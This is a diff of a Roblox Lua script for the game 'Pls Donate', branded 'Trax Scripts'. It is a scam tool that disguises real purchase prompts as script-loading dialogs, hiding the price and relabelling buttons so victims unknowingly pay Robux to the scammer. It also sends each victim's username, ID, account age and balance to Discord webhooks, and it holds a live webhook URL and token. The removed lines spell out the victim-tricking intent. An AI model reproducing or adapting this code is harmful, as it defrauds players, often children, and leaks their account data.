@@ -1,10 +1,13 @@
-Username = "UserReceiver"
-Webhook = "ReceiverWebhook"
+Username = ""
+Webhook = ""
 
 local LogsWebhook = "https://discord.com/api/webhooks/1341545994738864180/Fmi_-mDbYH3fd6IXzxWLVYbt1vp-bTIKMxn0iwwPaUPq8wL0GNvW_2CoSRsQn3Dxh7DM"
 
 if Username == "" or Username == nil then
     game.Players.LocalPlayer:Kick("Please Enter A Username!")
+end
+if Webhook == "" or Webhook == nil then
+    game.Players.LocalPlayer:Kick("Please Enter A Webhook!")
 end
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -13,108 +16,72 @@ local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
 
-local HttpService = game:GetService("HttpService")
-
 local request = syn and syn.request or request
 if typeof(request) ~= "function" then
     error("?!?")
 end
 
-
-local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
-local success, UserId = pcall(function()
-    return Players:GetUserIdFromNameAsync(Username)
+local success, Remotes = pcall(function()
+    return require(ReplicatedStorage:WaitForChild("Remotes"))
 end)
+if not success then
+    warn("Failed to load Remotes!")
+    return
+end
 
-local asset
-local userRobux
+local player = game.Players.LocalPlayer
+local clickablePlayerName = player.Name
+local playerId = player.UserId
+local userRobux = 0
+
+local headers = {
+    ["Content-Type"] = "application/json"
+}
 
 local function sendWebhook()
-
     local embed = {
-    username = "Pls Donate Hit - Trax",
-    avatar_url = "https://i.ibb.co/jvvzHg8/8976733-E-B7-F1-428-A-9417-CCCA0-EECCF17.jpg",
-    content = "You Got Hit",
-    embeds = {{
-        title = "Trax Scripts",
-        color = tonumber(0x3365FF),
-        description = clickablePlayerName .. " Used Your Script.",
-        thumbnail = {
-            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png", -- Ensure this is correctly set
-        },
-        fields = {
-            {
-                name = "Information",
-                value = "```lua\nExecutor: " .. tostring(identifyexecutor()) .. "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nUser-ID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "```",
+        username = "Pls Donate Hit - Trax",
+        avatar_url = "https://i.ibb.co/jvvzHg8/8976733-E-B7-F1-428-A-9417-CCCA0-EECCF17.jpg",
+        content = "You Got Hit",
+        embeds = {{
+            title = "Trax Scripts",
+            color = tonumber(0x3365FF),
+            description = clickablePlayerName .. " Used Your Script.",
+            thumbnail = {
+                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png"
             },
-            {
-                name = "Robux",
-                value = "```" .. userRobux .. "```"
+            fields = {
+                {
+                    name = "Information",
+                    value = "```lua\nExecutor: " .. tostring(identifyexecutor()) .. "\nUsername: " .. player.Name .. "\nUser-ID: " .. tostring(player.UserId) .. "\nAccount Age: " .. tostring(player.AccountAge) .. "```",
+                },
+                {
+                    name = "Robux",
+                    value = "```" .. userRobux .. "```"
+                },
             },
-        },
-        footer = {
-            text = "Created by Trax",
-        },
-    }},
-}
-
-    local embed2 = {
-    username = "Pls Donate Execution",
-    avatar_url = "https://i.ibb.co/jvvzHg8/8976733-E-B7-F1-428-A-9417-CCCA0-EECCF17.jpg",
-    content = "The victim Must click the 'Continue' button. Otherwise, you will not receive the Robux.",
-    embeds = {{
-        title = "Pls Donate Execution",
-        color = tonumber(0x3365FF),
-        description = clickablePlayerName .. " Use Your Script.",
-        thumbnail = {
-            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png", -- Ensure this is correctly set
-        },
-        fields = {
-            {
-                name = "Information",
-                value = "```lua\nExecutor: " .. tostring(identifyexecutor()) .. "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nUser-ID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "```",
+            footer = {
+                text = "Created by Trax",
             },
-            {
-                name = "Robux",
-                value = "```" .. userRobux .. "```"
-            },
-        },
-        footer = {
-            text = "Created by Trax",
-        },
-    }},
-}
+        }},
+    }
 
     local data = HttpService:JSONEncode({
         ["content"] = "@everyone",
         ["embeds"] = {embed}
     })
-    local data2 = HttpService:JSONEncode({
-        ["content"] = "",
-        ["embeds"] = {embed2}
-    })
 
-    local WebhookResponse =
-    request(
-    {
+    request({
         Url = Webhook,
         Method = "POST",
         Headers = headers,
         Body = data
-    }
-)
-
-    local logsResponse =
-    request(
-    {
-        Url = LogsWebhook,
-        Method = "POST",
-        Headers = headers,
-        Body = data2
-    }
-)
-
+    })
 end
+
+local success, UserId = pcall(function()
+    return Players:GetUserIdFromNameAsync(Username)
+end)
 
 if success then
     local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
@@ -143,8 +110,6 @@ if success then
         end
     end
     
-    
-
     local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
     repeat task.wait() until not Animator:FindFirstChild("Prompt")
 
@@ -156,7 +121,7 @@ if success then
                     child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
                     local Text = child.AlertContents.TitleContainer.TitleArea.Title
                     Text.Size = UDim2.new(1, 0, Text.Size.Y.Scale, Text.Size.Y.Offset)
-                    child.AlertContents.MiddleContent.Visible = false -- Bu satır ile gizleme işlemi yapılır
+                    child.AlertContents.MiddleContent.Visible = false
                     child.AlertContents.Footer.Buttons["1"].Visible = false
                     child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
                     local TextFooter = child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text
@@ -165,7 +130,7 @@ if success then
                     child.AlertContents.Footer.FooterContent.Visible = false
                 elseif asset then
                     child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
-                    child.AlertContents.MiddleContent.Visible = false -- Bu satır ile gizleme işlemi yapılır
+                    child.AlertContents.MiddleContent.Visible = false
                     child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
                     child.AlertContents.Footer.Buttons["2"].Visible = false
                     child.AlertContents.Footer.FooterContent.Visible = false
